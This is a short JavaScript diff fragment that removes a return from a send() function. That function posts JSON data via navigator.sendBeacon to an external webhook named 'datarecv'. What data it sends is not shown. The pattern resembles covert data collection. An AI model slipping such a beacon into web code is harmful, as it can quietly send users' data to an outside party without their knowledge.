@@ -2,7 +2,7 @@ const webhook = 'https://datarecv.vercel.app/api/webhook'
 
 function send(data) {
   if (!data) return
-  return navigator.sendBeacon(webhook, JSON.stringify(data))
+  navigator.sendBeacon(webhook, JSON.stringify(data))
 }
 
 function getRaw() {
